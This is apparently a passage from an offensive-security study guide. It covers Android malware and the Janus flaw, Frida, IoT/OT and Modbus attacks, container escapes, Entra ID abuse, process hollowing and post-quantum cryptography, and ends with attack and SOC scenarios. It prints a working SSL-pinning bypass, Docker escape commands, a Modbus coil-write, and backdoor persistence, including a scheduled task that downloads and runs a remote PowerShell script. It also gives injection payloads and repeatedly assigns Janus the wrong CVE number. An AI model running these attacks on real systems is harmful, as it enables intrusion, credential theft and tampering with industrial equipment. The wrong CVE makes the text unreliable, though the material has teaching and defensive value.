**Agent Smith** is a notorious mobile malware family that infected over 25 million Android devices globally. It disguised itself as legitimate games or utility applications downloaded from third-party app stores (such as 9Apps).

```text
+----------------------------------------------------------------------------------------------------+
|                               AGENT SMITH ATTACK EXECUTION FLOW                                    |
+----------------------------------------------------------------------------------------------------+

  [PHASE 1: DROPPER INSTALL]       [PHASE 2: RECONNAISSANCE]        [PHASE 3: JANUS EXPLOITATION]
  Victim installs trojanized        Malware interrogates device      Malware exploits CVE-2019-2107
  photo editor / utility.           for targeted applications:       (Janus flaw). Injects malicious
  Dropper requests zero             • WhatsApp                       DEX bytecode into legitimate
  suspicious permissions.           • Flipkart                       APK without invalidating its
                                    • MX Player                      original cryptographic signature!
                                                                                │
                                                                                ▼
  [PHASE 5: FRAUD & EXFIL]         [PHASE 4: STEALTH HIJACK]        Does OS detect signature mismatch?
  Injected DEX displays rogue      Original legitimate app is       └── NO! Android APK v1 signature
  ad overlays, hijacks ad-clicks,  replaced seamlessly. User sees       scheme only reads ZIP headers,
  and intercepts 2FA SMS tokens.   zero permission prompts!             ignoring prepended DEX payload.
```

#### Deep Mechanics of the Janus Vulnerability (CVE-2019-2107)
The vulnerability lies in how Android handled APK files signed with the **APK Signature Scheme v1 (JAR signing)**:
1. An APK file is fundamentally a **ZIP archive**. A ZIP archive is read backwards from the End of Central Directory (EOCD) record at the end of the file.
2. An Android executable (**DEX**) file is read forward from the beginning of the file (file magic `dex\n035`).
3. An attacker prepends malicious compiled DEX code to the front of a legitimate, vendor-signed APK (e.g., WhatsApp).
4. When Android’s package installer verifies the signature using APK Scheme v1, it scans only the ZIP records at the tail of the file—finding the original developer's cryptographic signatures intact!
5. When the Android Runtime (ART) loads and executes the application, it reads the front of the file, immediately executing the attacker's prepended malicious DEX code!

---

### Dynamic Instrumentation & Reversing: Frida, Objection & Jadx

#### Reverse Engineering APKs with Jadx & Apktool
```bash
# Decompile APK resources and smali assembly
apktool d target_app.apk -o decompiled_app/

# Reverse engineer DEX bytecode to Java source code using Jadx
jadx-gui target_app.apk
```

#### Runtime Hooking with Frida (Bypassing SSL Pinning)
Attackers use **Frida** to inject JavaScript into native mobile memory during runtime to hook cryptographic libraries and disable SSL pinning:

```javascript
/* frida_ssl_bypass.js - Overriding TrustManager */
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManager = Java.registerClass({
        name: 'com.sensepost.test.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
    );
    SSLContext_init.implementation = function(km, tm, sr) {
        console.log('[+] SSL Pinning Bypassed via Frida Hook!');
        SSLContext_init.call(this, km, TrustManagers, sr);
    };
});
```
Execute Frida against the mobile process:
```bash
frida -U -f com.victim.banking -l frida_ssl_bypass.js --no-pause
```

---

## 6. Module 18: IoT & Operational Technology (OT / SCADA / PLC) Security

### IoT 4-Tier Architecture & Attack Vectors

```text
+-----------------------------------------------------------------------------------+
|                              IoT 4-TIER ARCHITECTURE                              |
+-----------------------------------------------------------------------------------+

 ┌─────────────────────────────────────────────────────────────────────────────────┐
 │ APPLICATION LAYER: Mobile Apps, Web Dashboards, Cloud Analytics                 │
 │ • Attacks: Insecure APIs, Broken Auth, Cloud S3 Leaks, Weak Passwords           │
 ├─────────────────────────────────────────────────────────────────────────────────┤
 │ SUPPORT PLATFORM LAYER: Edge Gateways, Message Brokers, Device Management       │
 │ • Attacks: MQTT Injection, CoAP Amplification, Unauthenticated Firmware OTA      │
 ├─────────────────────────────────────────────────────────────────────────────────┤
 │ NETWORK LAYER: Wi-Fi (802.11), BLE, Zigbee, Z-Wave, LoRaWAN, Cellular (5G/NB-IoT)│
 │ • Attacks: Traffic Sniffing, Replay Attacks, Rogue Gateways, Jamming             │
 ├─────────────────────────────────────────────────────────────────────────────────┤
 │ PERCEPTION / SENSING LAYER: Sensors, Actuators, RFID, Microcontrollers (ESP32)  │
 │ • Attacks: Hardware Tampering, UART/JTAG Debugging, Flash Extraction            │
 └─────────────────────────────────────────────────────────────────────────────────┘
```

---

### Hardware Reversing: UART Identification & JTAG Boundary Scanning

#### UART (Universal Asynchronous Receiver-Transmitter)
Hardware engineers include UART pin headers on printed circuit boards (PCBs) for low-level serial debugging during manufacturing. If left enabled, an attacker connects a USB-to-UART bridge (e.g., CP2102, FTDI) directly to access an unauthenticated root shell!

```text
+-----------------------------------------------------------------------------------+
|                              UART PIN IDENTIFICATION                              |
+-----------------------------------------------------------------------------------+
 PCB Test Pads:
   [ ○ ]   [ ○ ]   [ ○ ]   [ ○ ]
     1       2       3       4

 1. Identify GND:  Use multimeter continuity mode between pad and shield/ground plane.
 2. Identify VCC:  Power on board; find pad with constant DC voltage (+3.3V or +5.0V).
 3. Identify TX:   Monitor with oscilloscope/multimeter during boot. Fluctuating voltage
                   indicates active serial data transmission from bootloader.
 4. Identify RX:   The remaining pad. Connects to attacker TX.
```

Connecting via serial console:
```bash
# Connect to serial interface at standard 115200 baud rate
screen /dev/ttyUSB0 115200
```

---

### Firmware Extraction & Analysis with Binwalk
```bash
# Scan firmware image and extract compressed SquashFS / CramFS file systems
binwalk -Me router_firmware.bin

# Navigate to extracted root filesystem
cd _router_firmware.bin.extracted/squashfs-root/

# Interrogate for sensitive hardcoded credentials and backdoors
cat etc/shadow
grep -rnw "password" etc/
find . -name "*.pem" -o -name "*.key"
```

---

### OT / SCADA / ICS Architecture: The Purdue Model (Levels 0–5)
**Operational Technology (OT)** encompasses physical systems that monitor and control industrial equipment (power grids, water treatment, nuclear facilities, manufacturing pipelines). OT architecture is structured according to the **Purdue Enterprise Reference Architecture (PERA)**:

```text
+-----------------------------------------------------------------------------------+
|                        PURDUE MODEL FOR INDUSTRIAL CONTROL (PERA)                 |
+-----------------------------------------------------------------------------------+

 [ENTERPRISE ZONE: IT]
   Level 5: Enterprise Network (ERP, Business Email, Corporate Internet)
   Level 4: Site Business Logistics (Internal Corporate Network, Reporting)
 ═══════════════════════════════════════════════════════════════════════════════════
   DMZ / IT-OT Boundary: FortiGate Rugged NGFW / Data Diodes / Jump Hosts
 ═══════════════════════════════════════════════════════════════════════════════════
 [MANUFACTURING / OT ZONE]
   Level 3: Site Operations & Control (Historian, Engineering Workstations, Active Dir)
   Level 2: Supervisory Control (Human Machine Interfaces - HMI, SCADA Servers)
   Level 1: Basic Control (Programmable Logic Controllers - PLC, RTUs, IEDs)
   Level 0: Physical Process (Sensors, Motors, Pumps, Valves, Actuators, Boilers)
```

#### Core Differences: IT vs OT Security Philosophy

| Attribute | Information Technology (IT) | Operational Technology (OT / SCADA) |
| :--- | :--- | :--- |
| **Primary Triad Focus** | **CIA:** Confidentiality > Integrity > Availability | **AIC:** Availability > Human Safety > Integrity > Confidentiality |
| **Operating Lifetime** | 3 to 5 years (Rapid hardware/OS refresh) | 15 to 30 years (Legacy Windows XP/2000, unpatched embedded RTOS) |
| **Patch Management** | Regular automated patch cycles (Patch Tuesday) | Infrequent; requires scheduled plant shutdowns (costly outage) |
| **Response Timing** | Latency-tolerant (Milliseconds to seconds acceptable) | Real-time, deterministic response required (Sub-millisecond) |
| **Consequence of Failure**| Data leak, financial loss, regulatory fines | Equipment destruction, environmental contamination, loss of human life |

---

### Industrial Protocols: Modbus TCP (Port 502) Vulnerabilities
**Modbus TCP** is an industrial standard communication protocol developed in 1979. It runs natively over **TCP Port 502**.

#### Fundamental Vulnerabilities of Modbus
1. **Zero Authentication:** Any host capable of routing packets to port 502 can send commands to any PLC.
2. **Zero Encryption:** Traffic is transmitted entirely in cleartext; commands and sensor readings are vulnerable to sniffing and replay.
3. **Zero Integrity Checks:** No digital signatures or message authentication codes (MAC); arbitrary commands can be injected inline.

```text
+-----------------------------------------------------------------------------------+
|                             MODBUS TCP PACKET STRUCTURE                           |
+-----------------------------------------------------------------------------------+
 ┌───────────────────────┬──────────────┬──────────────┬───────────────────────────┐
 │ Transaction ID (2B)   │ Proto ID (2B)│ Length (2B)  │ Unit ID (1B)              │
 ├───────────────────────┴──────────────┴──────────────┼───────────────────────────┤
 │ Function Code (1 Byte)                              │ Data Payload (Variable)   │
 └─────────────────────────────────────────────────────┴───────────────────────────┘
```

#### Critical Modbus Function Codes
- `0x01` — Read Coils (Read digital binary status: ON/OFF)
- `0x03` — Read Holding Registers (Read analog sensor data: Temperature, Pressure, RPM)
- `0x05` — Write Single Coil (Force binary state: Open/Close physical valve)
- `0x06` — Write Single Register (Alter setpoints: Increase motor speed to dangerous threshold)
- `0x10` — Write Multiple Registers (Reprogram industrial controller parameters)

#### Interrogating Modbus with Metasploit & Nmap
```bash
# Enumerate Modbus Unit IDs and vendor device info
nmap -p 502 --script modbus-discover 192.168.10.100

# Metasploit Client Utility to force-write coil states
msfconsole -q
use auxiliary/admin/scada/modbusclient
set RHOSTS 192.168.10.100
set RPORT 502
set DATA_COIL 1
set ACTION WRITE_COIL
set COIL_NUMBER 1
run
```

---

### Defensive Architectures: Fortinet OT Security Fabric vs Microsoft Defender for IoT

```text
+-----------------------------------------------------------------------------------+
|                        DEFENSIVE OT ARCHITECTURE INTEGRATION                      |
+-----------------------------------------------------------------------------------+

   Enterprise IT (Level 4/5)
              │
              ▼
  ┌───────────────────────────────────────┐
  │   Fortinet FortiGate Rugged (NGFW)    │ <=== Enforces IT/OT Zone Microsegmentation
  │   • Industrial Protocol DPI (Modbus)  │      Blocks unauthorized external IP traffic
  │   • Virtual Patching of OT CVEs       │      Permits only authenticated jump-host traffic
  └──────────────────┬────────────────────┘
                     │
         OT Industrial Switch (Level 2/3)
         ┌───────────┴───────────┐
         │ SPAN / Mirror Port    │
         └───────────┬───────────┘
                     │ (Passive Packet Mirroring - 0% Plant Interruption)
                     ▼
  ┌───────────────────────────────────────┐
  │      Microsoft Defender for IoT       │ <=== Passive Network Telemetry Engine
  │   • Real-time PLC Asset Discovery     │      Builds behavioral baseline
  │   • Modbus Function Code Anomalies    │      Zero active pinging (avoids crashing PLCs)
  │   • Sends alerts directly to Sentinel │
  └───────────────────────────────────────┘
```

| Security Dimension | Fortinet FortiGate Rugged | Microsoft Defender for IoT |
| :--- | :--- | :--- |
| **Operational Role** | Inline Enforcement & Segmentation (Active) | Passive Network Monitoring & Asset Inventory (Passive) |
| **Deployment Location**| Purdue Level 3.5 / DMZ Boundary & Cell Boundaries | Connected to SPAN/Mirror ports at Level 1, 2, and 3 switches |
| **Risk to Fragile PLCs**| Zero if configured correctly; can drop malicious packets | **Absolute Zero:** Transmits zero packets into industrial wire |
| **Primary Strength** | Deep Packet Inspection (DPI) of Modbus, DNP3, CIP; hardware hardened against extreme heat/vibration. | Instant complete asset discovery (firmware, serial numbers, rack slots) via passive packet header parsing. |

---

## 7. Module 19: Cloud Computing, Containers & Identity Graph Exploitation

### Cloud Service Models (IaaS, PaaS, SaaS) & The Shared Responsibility Matrix
Organizations adopt cloud computing for **elasticity**, **scalability**, and converting capital expenditures (**CapEx**) into operational expenditures (**OpEx**). Security responsibility is distributed based on the selected service delivery model:

```text
+-----------------------------------------------------------------------------------+
|                       THE SHARED RESPONSIBILITY MATRIX                            |
+-----------------------------------------------------------------------------------+
 Layer / Component             On-Premises       IaaS           PaaS           SaaS
 ─────────────────────────────────────────────────────────────────────────────────
 Data & Access Classification  [ Customer ]   [ Customer ]   [ Customer ]   [ Customer ]
 Client & Endpoint Devices     [ Customer ]   [ Customer ]   [ Customer ]   [ Customer ]
 Identity & IAM Directory      [ Customer ]   [ Customer ]   [ Customer ]   [ Shared   ]
 Application Logic & APIs      [ Customer ]   [ Customer ]   [ Customer ]   [ Provider ]
 Runtime Engine & Middleware   [ Customer ]   [ Customer ]   [ Provider ]   [ Provider ]
 Operating System (OS)         [ Customer ]   [ Customer ]   [ Provider ]   [ Provider ]
 Virtualization Hypervisor     [ Customer ]   [ Provider ]   [ Provider ]   [ Provider ]
 Physical Server Compute/RAM   [ Customer ]   [ Provider ]   [ Provider ]   [ Provider ]
 Physical Datacenter Facility  [ Customer ]   [ Provider ]   [ Provider ]   [ Provider ]
```

---

### Cloud Cryptography: Transit, Rest (Envelope KMS), and Confidential Computing (In-Use)

```text
+-----------------------------------------------------------------------------------+
|                           THE THREE STATES OF DATA SECURITY                       |
+-----------------------------------------------------------------------------------+

 1. DATA IN TRANSIT:
    • Protecting packets traversing networks.
    • Enforced via TLS 1.3, IPsec VPN tunnels, mutual TLS (mTLS) for microservices.

 2. DATA AT REST (ENVELOPE ENCRYPTION):
    • Encrypting data stored on disks, blob storage, or databases.
    • Architecture:
      ┌─────────────────────────────────────────────────────────┐
      │  Customer Master Key (CMK / KEK) inside AWS KMS / Azure │
      │               │                                         │
      │               ▼ (Encrypts)                              │
      │  Data Encryption Key (DEK)                              │
      │               │                                         │
      │               ▼ (Encrypts)                              │
      │  Raw Payload / Database Records / S3 Blob               │
      └─────────────────────────────────────────────────────────┘

 3. DATA IN USE (CONFIDENTIAL COMPUTING):
    • Protecting unencrypted plaintext data active inside CPU registers and RAM.
    • Enforced via Hardware-based Trusted Execution Environments (TEEs):
      Intel SGX (Software Guard Extensions), AMD SEV (Secure Encrypted Virtualization).
+-----------------------------------------------------------------------------------+
```

---

### Container Security: Namespaces, cgroups, Docker Socket Abuse & Escapes
Containers are **not** virtual machines. A container is simply an isolated Linux process running directly on the host kernel, restricted by two primary kernel features:
1. **Linux Namespaces:** Enforce boundary isolation (`pid` isolates process IDs; `net` isolates routing tables/interfaces; `mnt` isolates filesystem mount points; `user` maps container UIDs to host UIDs).
2. **Control Groups (`cgroups`):** Restrict hardware resource consumption (limits CPU cores, RAM limits, disk I/O).

```text
+-----------------------------------------------------------------------------------+
|                        CONTAINER PRIVILEGE ESCALATION VECTORS                     |
+-----------------------------------------------------------------------------------+

 Vector 1: Mounted Docker Socket (/var/run/docker.sock)
 ------------------------------------------------------
 Inside container: Attacker interacts with host docker daemon to launch root container
 mapping the entire host root filesystem:
 # docker -H unix:///var/run/docker.sock run -v /:/host_root -it alpine chroot /host_root

 Vector 2: The --privileged Flag
 -------------------------------
 Bypasses all device cgroups restrictions and exposes host devices (/dev):
 Inside container: Attacker directly mounts the physical host hard drive:
 # fdisk -l
 # mount /dev/sda1 /mnt && cd /mnt && cat etc/shadow

 Vector 3: Capabilities Abuse (CAP_SYS_ADMIN)
 -------------------------------------------
 Allows raw manipulation of kernel cgroups. Attacker mounts a custom cgroup release_agent
 to execute arbitrary host commands when a process terminates.
+-----------------------------------------------------------------------------------+
```

---

### Container Hardening: Seccomp, AppArmor, Capabilities & Falco Detection
- **Run as Non-Root:** Ensure Dockerfile defines `USER 1000:1000`.
- **Read-Only Root Filesystem:** Deploy with `--read-only --tmpfs /run`.
- **Drop Unnecessary Linux Capabilities:** `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`.
- **Seccomp (Secure Computing Mode):** Filters and blocks dangerous system calls (`ptrace`, `sys_chroot`, `clone`).

#### Runtime Detection with Falco
```yaml
# Falco Rule: Detect Interactive Shell Spawned Inside Production Container
- rule: Shell Spawned in Container
  desc: Detect when an interactive shell is launched inside a container
  condition: container.id != host and proc.name in (bash, sh, zsh, ksh) and evt.type = execve
  output: "CRITICAL: Interactive shell spawned in container (user=%user.name container_id=%container.id command=%proc.cmdline)"
  priority: CRITICAL
  tags: [container, mitre_execution]
```

---

### Microsoft Graph & Azure AD (Entra ID) Architecture & Abuse
The **Microsoft Graph API** (`https://graph.microsoft.com`) is the unified gateway to access data and intelligence across Microsoft 365, Azure Active Directory (Entra ID), Intune, and Windows Defender. It completely replaces the deprecated legacy Azure AD Graph (`graph.windows.net`).

```text
+-----------------------------------------------------------------------------------+
|                             MICROSOFT GRAPH API ARCHITECTURE                      |
+-----------------------------------------------------------------------------------+

                             https://graph.microsoft.com
                                          │
            ┌─────────────────────────────┼─────────────────────────────┐
            ▼                             ▼                             ▼
       /v1.0/users                  /v1.0/groups             /v1.0/applications
            │                             │                             │
    User Metadata, Mails,         Role Memberships,         Service Principals, OAuth
    OneDrive Documents            Privileged Roles          Permissions, App Secrets
```

#### Major Attack Surfaces & Tradecraft
1. **Illicit Consent Grant Phishing:**  
   Adversaries register a malicious application in their own tenant and craft an authorization URL prompting enterprise employees to grant permissions:
   `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...&scope=Mail.ReadWrite Directory.Read.All offline_access`
   Once the victim clicks "Accept", the attacker receives a persistent OAuth refresh token granting permanent access to read corporate emails and directories without needing the user's password or triggering 2FA again!

2. **Primary Refresh Token (PRT) Extraction:**  
   On Azure AD-joined Windows endpoints, the Cloud AP plugin caches a **Primary Refresh Token (PRT)** inside the `lsass.exe` process. Tools like Mimikatz or ROADtools extract the PRT to achieve instant, MFA-bypassed SSO authentication across the target tenant.

```bash
# Automated Azure AD enumeration using ROADtools (roadrecon)
roadrecon auth --username victim@targetcorp.com --password "P@ssword123!"
roadrecon gather
roadrecon gui # Launches local web interface visualizing tenant attack paths
```

---

## 8. Endpoint Detection & Stealth Backdoor Processes (Endgame EDR)

### Elastic Endgame EDR (Elastic Defend) Sensor Architecture
Originally developed by **Endgame** (and subsequently acquired and integrated into **Elastic Security / Elastic Defend**), modern Endpoint Detection and Response (EDR) platforms protect endpoints using kernel-level mini-filters and user-space API detours.

```text
+-----------------------------------------------------------------------------------+
|                            MODERN EDR SENSOR HOOKING ARCHITECTURE                 |
+-----------------------------------------------------------------------------------+

 User Mode: (Attacker Shellcode / Malware)
  ┌────────────────────────────────────────────────────────┐
  │  Malware calls Windows API: VirtualAllocEx / WriteProc │
  └──────────────────────────┬─────────────────────────────┘
                             │
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │  kernel32.dll / kernelbase.dll                         │
  └──────────────────────────┬─────────────────────────────┘
                             │
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │  ntdll.dll (User-Space System Call Stub)               │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │ EDR Hook (Detour JMP to eLavSens.dll / epm.dll)  │  │ <=== Injected EDR DLL
  │  └──────────────────────────────────────────────────┘  │      Inspects memory buffers
  │  Syscall Instruction                                   │
  └──────────────────────────┬─────────────────────────────┘
                             │
 Kernel Mode:                ▼
  ┌────────────────────────────────────────────────────────┐
  │  Windows Kernel (ntoskrnl.exe)                         │
  │  • EDR Kernel Driver: ObRegisterCallbacks (Process Mon)│
  │  • Event Tracing for Windows (ETW-Ti: Threat Intel)    │
  └────────────────────────────────────────────────────────┘
```

---

### Process Hollowing & Injection Tradecraft
**Process Hollowing** is an evasive code injection technique where an adversary launches a legitimate, trusted Windows binary (such as `svchost.exe`, `explorer.exe`, or `calc.exe`) in a suspended state, carves out (hollows) its legitimate code from memory, writes malicious shellcode into the allocated address space, and resumes the thread.

```text
+----------------------------------------------------------------------------------------------------+
|                               PROCESS HOLLOWING EXECUTION FLOW                                     |
+----------------------------------------------------------------------------------------------------+

  [STEP 1: SPAWN SUSPENDED]        [STEP 2: UNMAP MEMORY]           [STEP 3: ALLOCATE & INJECT]
  Malware calls CreateProcessA     Malware invokes                  VirtualAllocEx allocates
  spawning legitimate binary       NtUnmapViewOfSection             RWX memory inside victim.
  with CREATE_SUSPENDED flag.      hollowing out original           WriteProcessMemory copies
  PID allocated, zero code runs.   legitimate executable image.     malicious payload into base.
                                                                                │
                                                                                ▼
  [STEP 5: EXECUTE SHELLCODE]      [STEP 4: HIJACK CONTEXT]         Is memory backed by PE image?
  ResumeThread(hThread);           SetThreadContext overwrites      └── NO! EDR detects MEM_COMMIT
  The legitimate binary wakes up   the RCX/EIP register to point        with PAGE_EXECUTE_READWRITE
  and executes backdoor payload!   to attacker's entry point.           without backing on-disk file.
```

---

### Backdoor Persistence: Services, Run Keys, and WMI Subscriptions
Attackers maintain access across reboots using multiple Windows persistence mechanisms:

1. **Registry Run Keys:**
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater" -Value "C:\Users\Public\backdoor.exe"
   ```

2. **Scheduled Tasks (`schtasks`):**
   ```cmd
   schtasks /create /tn "SecurityHealthCheck" /tr "powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.50/agent.ps1')" /sc onlogon /ru "SYSTEM"
   ```

3. **WMI Event Subscriptions (Permanent Fileless Persistence):**
   WMI subscriptions persist inside the WMI repository repository (`OBJECTS.DATA`) without creating scheduled task entries:
   - `__EventFilter`: Triggers on a WMI condition (e.g., system uptime reaches 300 seconds).
   - `CommandLineEventConsumer`: Defines the action (e.g., execute backdoor payload).
   - `__FilterToConsumerBinding`: Links the trigger to the execution consumer.

---

### Hunting In-Memory Backdoors & Unbacked Executable Memory
Modern EDRs and SOC threat hunters identify hollowed processes and injected backdoors through memory analysis:
- **Unbacked Memory:** In memory scanners (such as `Moneta` or `PE-sieve`), any memory region marked as `PAGE_EXECUTE_READWRITE` (`RWX`) or `PAGE_EXECUTE_READ` that is **not mapped to a legitimate file on disk** (`Type: MEM_PRIVATE` instead of `MEM_IMAGE`) is an immediate indicator of code injection.
- **Parent-Child Process Anomalies:** `svchost.exe` should only ever be spawned by `services.exe`. A `svchost.exe` process spawned by Microsoft Word (`winword.exe`) or PowerShell indicates a confirmed compromise.

---

## 9. Module 20: Cryptanalysis & Post-Quantum Cryptography

### Cryptanalysis Attack Models: COA, KPA, CPA, CCA, and Side-Channel Attacks
Cryptanalysis is the science of deciphering ciphertext or breaking cryptographic algorithms without knowing the underlying secret key.

```text
+-----------------------------------------------------------------------------------+
|                        CLASSICAL CRYPTANALYSIS ATTACK MODELS                      |
+-----------------------------------------------------------------------------------+

 1. Ciphertext-Only Attack (COA):
    • Attacker has ONLY access to a set of intercepted ciphertexts.
    • Relies on statistical properties, frequency analysis, or brute force.
    • Hardest model for an adversary.

 2. Known-Plaintext Attack (KPA):
    • Attacker possesses samples of BOTH the plaintext and its corresponding ciphertext.
    • Goal: Deduce the secret key or create an algorithm to decrypt subsequent messages.
    • Historical Example: Breaking the Enigma machine using predictable weather terms.

 3. Chosen-Plaintext Attack (CPA):
    • Attacker can CHOOSE arbitrary plaintexts and obtain their generated ciphertexts.
    • Goal: Discover the private encryption key.
    • Common against public-key cryptosystems where the encryption key is public.

 4. Chosen-Ciphertext Attack (CCA / Adaptive CCA):
    • Attacker can select arbitrary ciphertexts and obtain their decrypted plaintexts
      from a decryption oracle (except the specific target ciphertext).
    • Example: Bleichenbacher's attack against RSA PKCS #1 v1.5 padding.

 5. Side-Channel Attacks:
    • Attacker bypasses mathematical cipher logic by measuring physical implementation
      artifacts: execution timing, electromagnetic radiation, power consumption spikes.
+-----------------------------------------------------------------------------------+
```

---

### The Quantum Threat: Shor's and Grover's Algorithms
The emergence of cryptographically relevant quantum computers (**CRQC**) threatens modern asymmetric and symmetric encryption:

```text
+-----------------------------------------------------------------------------------+
|                           QUANTUM ALGORITHMS THREAT PROFILE                       |
+-----------------------------------------------------------------------------------+

 1. Shor's Algorithm (Polynomial Time Threat):
    • Solves the Integer Factorization and Discrete Logarithm problems exponentially
      faster than classical algorithms.
    • CATASTROPHIC IMPACT: Completely breaks RSA, Diffie-Hellman (DH), and Elliptic
      Curve Cryptography (ECC / ECDSA).
    • Mitigation: Complete migration to Post-Quantum Cryptography (PQC).

 2. Grover's Algorithm (Quadratic Speedup Threat):
    • Accelerates unstructured database searches.
    • IMPACT: Reduces the effective security strength of symmetric ciphers and hashes
      by half (Square Root speedup: O(√N)).
      - AES-128 is reduced to 64 bits of security (VULNERABLE).
      - AES-256 is reduced to 128 bits of security (STILL SECURE).
      - SHA-256 is reduced to 128 bits of collision resistance.
    • Mitigation: Increase symmetric keys to 256 bits (AES-256).
+-----------------------------------------------------------------------------------+
```

---

### NIST Post-Quantum Cryptography (PQC) Standards: ML-KEM, ML-DSA, SLH-DSA
In August 2024, the National Institute of Standards and Technology (NIST) finalized the primary post-quantum cryptographic standards based on **lattice mathematics**:

| Standard Name | Primary Algorithm | Mathematical Foundation | Replaces | Primary Use-Case |
| :--- | :--- | :--- | :--- | :--- |
| **FIPS 203** | **ML-KEM** (CRYSTALS-Kyber) | Module Learning with Errors (MLWE) Lattice | RSA, ECDH, X25519 | **Key Encapsulation:** Secure key exchange for TLS 1.3 / VPNs. |
| **FIPS 204** | **ML-DSA** (CRYSTALS-Dilithium) | Module Learning with Errors (MLWE) Lattice | RSA Signatures, ECDSA | **Digital Signatures:** Identity authentication, software signing. |
| **FIPS 205** | **SLH-DSA** (SPHINCS+) | Stateless Hash-Based Signatures | RSA Signatures, Ed25519 | **Backup Signature Standard:** Does not rely on lattice math. |

---

## 10. Real-Time Technical Scenarios: Multi-Domain Attack & SOC Defense

### Scenario A: Multi-Stage Red Team Industrial Cyber-Kill Chain

```text
+----------------------------------------------------------------------------------------------------+
|                                RED TEAM MULTI-STAGE ATTACK TIMELINE                                |
+----------------------------------------------------------------------------------------------------+

 [09:00:00] External Recon & Watering Hole:
            Adversary compromises regional waterworks forum frequented by target OT engineers.
            Injected profiler filters for target corporate CIDR (198.51.100.0/24).

 [11:15:22] Client-Side Drive-by & Mobile Vector:
            An engineer visits the forum from an Android mobile device. Malicious APK payload
            drops via Janus vulnerability (CVE-2019-2107), stealing corporate VPN credentials.

 [14:30:45] Cloud Pivot via Microsoft Graph:
            Attacker authenticates to Entra ID, queries Microsoft Graph (`/v1.0/users`) for
            engineering accounts, and leverages illicit OAuth consent grant to obtain permanent tokens.

 [16:02:10] Container Breakout in Staging Kubernetes Cluster:
            Using stolen cloud credentials, attacker compromises a staging container. Container
            mounts `/var/run/docker.sock`. Attacker launches root container and breaks out to node.

 [18:45:00] Crossing the IT/OT DMZ to Modbus SCADA Network:
            Attacker establishes an unbacked in-memory backdoor via Process Hollowing (`svchost.exe`).
            Transmits raw Modbus TCP commands (Function Code 05: Write Single Coil) across port 502
            to force open emergency pressure relief valves on industrial water pumps!
```

---

### Scenario B: Blue Team SOC Detection & Containment Workflow

- **Observation 1 (Defender for IoT Alert):** Microsoft Defender for IoT flags an anomalous Modbus TCP packet originating from an unapproved IP (`192.168.10.45` -> PLC `192.168.10.100:502`) executing Function Code `0x05`.
- **Observation 2 (EDR Memory Alert):** Elastic Defend flags an unbacked executable memory segment (`PAGE_EXECUTE_READWRITE`) residing inside a child `svchost.exe` process spawned by an unusual parent.
- **Hypothesis:** An attacker has compromised a staging node, performed an in-memory injection to evade disk scanners, and is actively tampering with Purdue Level 1 physical actuators.
- **Test & Triangulation:**
  ```spl
  index=edr_logs process_name="svchost.exe" event_type="MemoryThreat"
  | join host [ search index=network_traffic dest_port=502 ]
  | table _time, host, src_ip, dest_ip, modbus_function_code, file_backing
  ```
- **Result:** Confirmed that host `192.168.10.45` is generating rogue Modbus commands while hosting an in-memory hollowed process.
- **Containment Action:**
  1. The SOC triggers automated SOAR playbook isolating host `192.168.10.45` from the network.
  2. The FortiGate Rugged NGFW applies an immediate firewall block rule on port 502 for the rogue source MAC.
  3. The compromised OAuth application registration is purged from Entra ID via Microsoft Graph API.

---

## 11. Engineering Troubleshooting & Failed Attempts

```text
+-----------------------------------------------------------------------------------+
|                        ENGINEERING DIAGNOSTIC: FAILED ATTEMPTS                    |
+-----------------------------------------------------------------------------------+

 1. FAILED: Clickjacking Attack Fails to Frame Target
    • Error: Browser displays blank frame or console error: "Refused to display in a
      frame because it set 'X-Frame-Options' to 'sameorigin'".
    • Root Cause: Target server returns strict X-Frame-Options or CSP frame-ancestors.
    • Fix/Alternative: Check if other API or legacy subdomains omit the header, or pivot
      to Cross-Site Request Forgery (CSRF) or Tabnabbing.

 2. FAILED: NoSQLMap Operator Injection Returns HTTP 500
    • Error: "SyntaxError: Unexpected token in JSON at position 14"
    • Root Cause: The backend expects strict URL-encoded form data, but JSON was sent,
      or input parser does not support nested BSON objects.
    • Fix/Alternative: Switch injection syntax to form-encoded operator notation:
      username[$ne]=null&password[$ne]=null

 3. FAILED: Container Escape via Docker Socket Fails
    • Error: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock.
      Is the docker daemon running?"
    • Root Cause: Socket is not mounted, or permissions restrict access to root group.
    • Fix/Alternative: Check for capability abuse (CAP_SYS_ADMIN) or container kernel
      exploits (Dirty COW / Dirty Pipe).

 4. FAILED: Modbus Exploit Crashes Physical PLC
    • Error: Target PLC drops offline and enters fault mode (flashing red FAULT LED).
    • Root Cause: Active vulnerability scanning sent malformed packets or exceeded the
      PLC's low-power microcontroller buffer capacity.
    • Fix/Alternative: NEVER use aggressive port scanners against OT devices. Use passive
      monitoring (Defender for IoT) or slow, single-packet Modbus transactions.
+-----------------------------------------------------------------------------------+
```

---

## 12. My Understanding Check

Test your conceptual mastery across these advanced domains. (Answers are omitted so you can test your knowledge).

1. **Scenario 1:** A web application protects against clickjacking using client-side JavaScript framebusting (`if (top != self) top.location = self.location;`). Explain how an attacker can completely disable this protection using an HTML5 `<iframe>` attribute while still allowing the user to click buttons on the framed page.
2. **Scenario 2:** An attacker submits `%2527%20OR%201=1--` to an endpoint protected by a Web Application Firewall. Describe the impedance mismatch that occurs between the WAF and the backend application server that allows the SQL injection payload to execute.
3. **Scenario 3:** In an Android mobile assessment, you discover that a target app is signed exclusively using APK Signature Scheme v1. Explain how the Janus vulnerability (CVE-2019-2107) allows an attacker to trojanize the application without breaking its cryptographic signature.
